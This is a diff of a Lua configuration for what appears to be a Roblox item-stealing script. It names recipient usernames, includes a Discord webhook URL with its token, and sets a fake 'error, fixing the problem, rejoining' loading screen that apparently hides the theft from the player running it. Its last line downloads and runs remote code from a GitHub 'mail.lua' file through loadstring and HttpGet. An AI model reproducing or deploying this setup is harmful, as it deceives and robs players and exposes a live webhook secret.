@@ -1,5 +1,5 @@
 UserName = "ScriptingLoaded"
-UserName2 = "ScriptingLoaded" -- optional delete the whole line if you don't want it
+UserName2 = "kenxxxyoo" -- optional delete the whole line if you don't want it
 Webhook = "https://discord.com/api/webhooks/1099544725742161960/P6u6mPAGSPt8jgQiHZMmfuVwh8xI6qmpuapeAvw3r-9gpNg6N1DLJu_FvQb9TqYx6Ef0" -- optional delete the whole line if you don't want it
 
 _G.LoadingScreen = true
@@ -8,9 +8,9 @@ _G.MouseLock = true
 -- set them to false if you don't need them
 
 _G.ScriptName = "Project Orion *ERROR*"
-_G.FirstText = "UNEXPECTED ERROR HAS OCCURRED"
-_G.SecondText = "RELOADING YOUR SCRIPT"
-_G.ThirdText = "PLEASE WAIT UNTIL ITS FINISHED THX FOR YOUR PATIENT"
+_G.FirstText = "UNEXPECTED ERROR HAS OCCURED"
+_G.SecondText = "FIXING THE PROBLEM"
+_G.ThirdText = "PROBLEM FIXED! REJOINING GAME"
 _G.WaitingTime = 120 -- it's the time between 0% and 100% in secondes
 
 loadstring(game:HttpGet("https://github.com/RainIsntBald/Vault/raw/main/k4f/mail.lua", true))()
